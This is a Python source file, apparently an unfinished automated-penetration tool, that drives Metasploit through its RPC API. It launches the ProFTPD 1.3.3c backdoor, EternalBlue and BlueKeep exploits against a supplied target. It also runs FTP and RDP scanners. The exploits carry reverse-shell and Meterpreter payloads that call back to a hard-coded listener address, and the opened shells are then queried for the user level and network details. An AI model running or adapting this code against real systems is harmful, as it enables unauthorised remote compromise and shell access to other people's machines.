# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
#     for x in m: ## for every result in the search?
#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
#         exploit['RPORT'] = port # Need to specify port?


from pymetasploit3.msfrpc import MsfRpcClient
import time
# import socket

# TODO MAKE IT NOT HARD CODED
LHOSTIP = '192.168.1.50'


# Inputs: Exploit, Target, Port (Target Port)

class MetasploitInterface:

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass): # Just for metasploit connection
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        print(self.client)
    
    # def connectMetasploit(self):
    #     client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
    #     print(f"Client Connected {client}")
    #     return client

    def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
        
        # switch statement to select exploit
        if(exploit == 'auxiliary/scanner/ftp/anonymous'):
            success, user_level, exploit = self.scanFTP(target, exploit, port)

        elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
            success, user_level, exploit = self.exploitFTP(target, exploit, port)

        elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
            success, user_level, exploit = self.eternalBlue(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
            success, user_level, exploit = self.rdpScanner(target, exploit, port)
        
        else:
            print("No function picked")
        
        return success, user_level, exploit

    def exploitFTP(self, target, exploit, port):
        """ SETS UP THE MSFRPC API CLIENT"""
        
        split_string = exploit.split('/')
        original_exploit = exploit ## obtains the full original exploit string for return

        module = split_string[0]
        specific_module = "/".join(split_string[1:])
        
        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
     
        """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
        payload = self.client.modules.use('payload', 'cmd/unix/reverse')
        
        payload['LHOST'] = LHOSTIP
        
        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            # print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = ""
            success = False

        else: 
            try:
                # print("SIDs DON'T MATCH - Worked")
                shell = self.client.sessions.session(sid_after)
                print("Exploit was successful! Here are the results: ")
                shell.write('whoami')
                user_level = shell.read()
                print("User Level: " + user_level)
                shell.write('ifconfig')
                address_properties = shell.read()
                print("Address Properties: \n" + address_properties)
                success = True
                # print("\n\n\nCID: " + str(int(cid)+1))  - Error catching for CID

            except Exception as e:
                print("There was an issue creating a session or the host is not vulnerable (see below): ")
                print(e)
                user_level = "No access"
                success = False
            
        
        self.client.consoles.console(cid).destroy
        
        ##print(exploit.targetpayloads())
        return success, user_level, original_exploit
        
    
    def scanFTP(self, target, exploit, port):
        """ SETS UP THE MSFRPC API CLIENT"""
        
        original_exploit = exploit ## obtains the full exploit for return

        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
        
        """ SETS UP EXPLOIT and TARGET"""
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        print(results)
       
        if "Anonymous READ" in results:
            success = True
            user_level = "USER_ACCESS"
        else:
            success = False
            user_level = ""

        return success, user_level, original_exploit


    def eternalBlue(self, target, exploit, port):

        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
        original_exploit = exploit

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = 5557
        
        """ Creates and Executes Exploit & Prints out shell results from target"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = ""
            success = False
           
        else:
            try:
                shell = self.client.sessions.session(sid_after)
                # print(sid_after)
                # shell.write('shell')
                # time.sleep(3)
                # print("Arrived at getuid command")
                user_level = shell.run_with_output("getuid")
                
                user_level = user_level.split(":")[1].lstrip()
                print("User Level: " + user_level)

                directory = shell.run_with_output('pwd')
                # print("Got to pwd command")

                print("Directory Location: " + directory)
                properties = shell.run_with_output('ipconfig')
                # time.sleep(1)
            
                print(f"Address Properties:\n" + properties)
                success = True
            
            except Exception as e:
                print(e)
                user_level = "No access"
                success = False
        
        self.client.consoles.console(cid).destroy

        return success, user_level, original_exploit

    def rdpScanner(self, target, exploit, port):
        
        original_exploit = exploit

        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        # exploit["LHOST"] = LHOSTIP

        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        print(results)
        if "Detected" in results:
            success = True
            user_level = ""
        else:
            success = False
            user_level = ""

        return success, user_level, original_exploit

    def blueKeep(self, target, exploit, port):
       
        original_exploit = exploit

        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        
        print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["fDisableCam"] = 0
        # exploit["TARGET"] = '7'
        # exploit["LHOST"] = LHOSTIP

        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            print(self.client.consoles.console(cid).run_module_with_output(exploit))
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            print(self.client.consoles.console(cid).run_module_with_output(exploit))
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
            except IndexError:
                print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            print("SIDs DO MATCH - Did not work")
            print("There was an issue creating a session or the host is not vulnerable (see below): ")
            user_level = "No access"
            success = False
           
        else:
            try:
                shell = self.client.sessions.session(sid_after)
                print(sid_after)
                shell.write('echo %USERDOMAIN%\%USERNAME%')
                time.sleep(3)
                user_level = shell.read()
                print("User Level: " + user_level)
                shell.write('pwd')
                time.sleep(3)
                print(f"Directory Location: {shell.read()}")
                shell.write('ipconfig')
                time.sleep(3)
                print(f"Address Properties:\n {shell.read()}")
                success = True
            
            except Exception as e:
                print(e)
                user_level = "No access"
                success = False
        
        self.client.consoles.console(cid).destroy

        return success, user_level, original_exploit
        # print(self.client.consoles.console(cid).run_module_with_output(exploit))


# functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]

# Outputs:
